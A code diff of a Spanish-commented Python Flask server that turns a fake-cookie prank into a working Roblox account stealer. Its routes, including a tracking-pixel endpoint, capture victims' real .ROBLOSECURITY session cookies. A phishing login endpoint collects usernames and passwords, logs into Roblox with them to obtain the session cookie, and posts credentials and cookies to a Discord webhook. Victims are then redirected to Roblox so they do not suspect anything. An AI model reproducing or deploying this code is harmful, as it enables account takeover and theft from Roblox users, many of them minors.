@@ -1,181 +1,156 @@
 from flask import Flask, request, Response, redirect
 import requests
 import json
-from datetime import datetime
 import os
 import base64
-import random
-import string
 
 app = Flask(__name__)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"
-
-# Lista de usuarios populares de Roblox para hacer más creíble
-POPULAR_USERS = ["Builderman", "Roblox", "1x1x1x1", "Shedletsky", "Telamon", "Asimo3089", "Badcc", "KreekCraft", "Flamingo", "TanqR"]
+WEBHOOK_URL = "https://discord.com/api/webhooks/TU_WEBHOOK_AQUI"
 
 # Imagen pixel transparente
 PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")
 
-def generate_fake_cookie():
-    """Genera un token que parece real de Roblox"""
-    prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
-    random_part = ''.join(random.choices("ABCDEF" + string.digits, k=732))
-    return prefix + random_part
-
-def get_random_user():
-    """Obtiene información de un usuario aleatorio de Roblox"""
+def send_to_discord(cookie, ip, user_agent, roblox_user_data=None):
+    """Envía la cookie real a Discord"""
     try:
-        username = random.choice(POPULAR_USERS)
-        userinfo = requests.get(f"https://api.roblox.com/users/get-by-username?username={username}").json()
-        user_id = userinfo.get("Id", "Unknown")
+        # Información del usuario de Roblox si está disponible
+        user_info = ""
+        if roblox_user_data:
+            user_info = f"\nUsername: {roblox_user_data.get('name', 'Unknown')}\nID: {roblox_user_data.get('id', 'Unknown')}"
         
-        moreinfo = requests.get(f"https://users.roblox.com/v1/users/{user_id}").json()
+        message = f"**Cookie Robada**\nIP: {ip}\nUser-Agent: {user_agent}\nCookie: `{cookie}`{user_info}"
         
-        # Obtener imagen del usuario
-        try:
-            image_response = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=352x352&format=Png&isCircular=false").json()
-            image_url = image_response["data"][0]["imageUrl"]
-        except:
-            image_url = "https://www.roblox.com/asset/?id=123456789"
-        
-        return {
-            "username": moreinfo.get("name", username),
-            "id": user_id,
-            "isBanned": moreinfo.get("isBanned", False),
-            "hasVerifiedBadge": moreinfo.get("hasVerifiedBadge", False),
-            "created": moreinfo.get("created", "Unknown"),
-            "image": image_url
-        }
-    except Exception as e:
-        print(f"Error getting user: {e}")
-        return None
-
-def send_to_discord(user_data, cookie, ip, user_agent):
-    """Envía la información a Discord con el formato del script original"""
-    try:
-        # Crear el embed como en el script original
-        embed = {
-            "title": "User Beamed - XSS Method",
-            "description": f"`{cookie}`",
-            "color": 16711765,  # 0x00ffd5
-            "thumbnail": {"url": user_data['image']},
-            "fields": [
-                {"name": "Username", "value": user_data['username'], "inline": True},
-                {"name": "ID", "value": str(user_data['id']), "inline": True},
-                {"name": "IsBanned", "value": str(user_data['isBanned']), "inline": True},
-                {"name": "IsVerified", "value": str(user_data['hasVerifiedBadge']), "inline": True},
-                {"name": "Created", "value": str(user_data['created']), "inline": True},
-                {"name": "IP", "value": str(ip), "inline": True}
-            ],
-            "footer": {"text": "Made by https://github.com/tizxr, give credits"}
-        }
-        
-        # Enviar a Discord
         payload = {
-            "content": "@everyone",
-            "embeds": [embed]
+            "content": message
         }
         
         response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
-        print(f"Sent to Discord: {user_data['username']} - Status: {response.status_code}")
+        print(f"Cookie enviada a Discord: {response.status_code}")
         
     except Exception as e:
-        print(f"Error sending to Discord: {e}")
+        print(f"Error: {e}")
+
+def get_roblox_user_info(user_id):
+    """Obtiene información del usuario por ID"""
+    try:
+        response = requests.get(f"https://users.roblox.com/v1/users/{user_id}")
+        return response.json()
+    except:
+        return None
 
 @app.route('/')
 def index():
-    # Capturar IP y User Agent
+    # Capturar headers importantes
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Unknown')
     
-    print(f"Request from IP: {ip}")
+    # Capturar la cookie real de Roblox
+    real_cookie = request.cookies.get('.ROBLOSECURITY', None)
     
-    # Generar cookie falsa que parece real
-    fake_cookie = generate_fake_cookie()
-    
-    # Obtener información de un usuario aleatorio
-    user_data = get_random_user()
-    
-    if user_data:
-        # Enviar a Discord
-        send_to_discord(user_data, fake_cookie, ip, user_agent)
+    if real_cookie:
+        print(f"Cookie real capturada de IP: {ip}")
+        
+        # Intentar obtener información del usuario usando la cookie
+        roblox_user_id = None
+        try:
+            # Hacer una solicitud autenticada a la API de Roblox
+            auth_response = requests.get(
+                "https://users.roblox.com/v1/users/authenticated",
+                cookies={'.ROBLOSECURITY': real_cookie},
+                timeout=10
+            )
+            if auth_response.status_code == 200:
+                user_data = auth_response.json()
+                roblox_user_id = user_data.get('id')
+                roblox_user_data = get_roblox_user_info(roblox_user_id)
+                send_to_discord(real_cookie, ip, user_agent, roblox_user_data)
+            else:
+                send_to_discord(real_cookie, ip, user_agent)
+        except:
+            send_to_discord(real_cookie, ip, user_agent)
+        
+        # Redirigir al perfil real de Roblox para que no sospechen
+        return redirect('https://www.roblox.com/home', code=302)
     else:
-        # Si falla, usar datos por defecto
-        default_data = {
-            "username": "Builderman",
-            "id": "123456",
-            "isBanned": False,
-            "hasVerifiedBadge": True,
-            "created": "2006-01-01T00:00:00Z",
-            "image": "https://www.roblox.com/asset/?id=123456789"
-        }
-        send_to_discord(default_data, fake_cookie, ip, user_agent)
-    
-    # Redirigir al perfil de Roblox
-    return redirect('https://www.roblox.com/es/users/7869790887/profile', code=302)
+        # Si no hay cookie, redirigir a Roblox (el usuario no está logueado)
+        return redirect('https://www.roblox.com/login', code=302)
 
 @app.route('/pixel.png')
 def pixel():
-    # Capturar IP
+    """Endpoint para tracking via img tag - captura cookie real también"""
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent', 'Unknown')
     
-    print(f"Pixel request from IP: {ip}")
+    real_cookie = request.cookies.get('.ROBLOSECURITY', None)
     
-    # Generar cookie falsa
-    fake_cookie = generate_fake_cookie()
+    if real_cookie:
+        print(f"Cookie real capturada desde pixel en IP: {ip}")
+        send_to_discord(real_cookie, ip, f"{user_agent} (via pixel)")
     
-    # Obtener usuario aleatorio
-    user_data = get_random_user()
-    
-    if user_data:
-        send_to_discord(user_data, fake_cookie, ip, "Pixel Tracker")
-    else:
-        default_data = {
-            "username": "Builderman",
-            "id": "123456",
-            "isBanned": False,
-            "hasVerifiedBadge": True,
-            "created": "2006-01-01T00:00:00Z",
-            "image": "https://www.roblox.com/asset/?id=123456789"
-        }
-        send_to_discord(default_data, fake_cookie, ip, "Pixel Tracker")
-    
-    # Devolver imagen pixel
     return Response(PIXEL, mimetype='image/png')
 
 @app.route('/api/capture', methods=['POST'])
 def capture():
+    """Endpoint para captura via JavaScript (aunque cookie es HttpOnly, el navegador la envía automáticamente)"""
+    try:
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        user_agent = request.headers.get('User-Agent', 'Unknown')
+        
+        # La cookie viene en los headers, no en el body
+        real_cookie = request.cookies.get('.ROBLOSECURITY', None)
+        
+        if real_cookie:
+            print(f"Cookie real capturada desde API en IP: {ip}")
+            send_to_discord(real_cookie, ip, f"{user_agent} (via API)")
+        
+        return {"status": "success"}
+    except Exception as e:
+        print(f"Error: {e}")
+        return {"status": "error"}
+
+@app.route('/api/login', methods=['POST'])
+def login_capture():
+    """Endpoint para capturar credenciales de login (phishing)"""
     try:
         data = request.json
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         
-        print(f"API capture from IP: {ip}")
+        username = data.get('username', '')
+        password = data.get('password', '')
         
-        # Generar cookie falsa
-        fake_cookie = generate_fake_cookie()
+        # Enviar credenciales a Discord
+        message = f"**Credenciales Robadas**\nIP: {ip}\nUsername: {username}\nPassword: {password}"
+        payload = {"content": message}
+        requests.post(WEBHOOK_URL, json=payload, timeout=10)
         
-        # Obtener usuario aleatorio
-        user_data = get_random_user()
-        
-        if user_data:
-            send_to_discord(user_data, fake_cookie, ip, "JS Capture")
-        else:
-            default_data = {
-                "username": "Builderman",
-                "id": "123456",
-                "isBanned": False,
-                "hasVerifiedBadge": True,
-                "created": "2006-01-01T00:00:00Z",
-                "image": "https://www.roblox.com/asset/?id=123456789"
+        # Intentar login real para obtener la cookie
+        session = requests.Session()
+        login_response = session.post(
+            "https://auth.roblox.com/v2/login",
+            json={
+                "ctype": "Username",
+                "cvalue": username,
+                "password": password
+            },
+            headers={
+                "X-CSRF-TOKEN": "1",
+                "Referer": "https://www.roblox.com/"
             }
-            send_to_discord(default_data, fake_cookie, ip, "JS Capture")
+        )
         
-        return {"status": "success"}
+        # Capturar la cookie del response
+        for cookie in session.cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                print(f"Cookie obtenida via login: {cookie.value}")
+                send_to_discord(cookie.value, ip, f"{request.headers.get('User-Agent')} (via login)")
+                break
+        
+        return {"status": "success", "message": "Logged in successfully"}
     except Exception as e:
-        print(f"Error in capture: {e}")
-        return {"status": "error", "message": str(e)}
+        print(f"Error: {e}")
+        return {"status": "error"}
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, ssl_context='adhoc')  # HTTPS es necesario
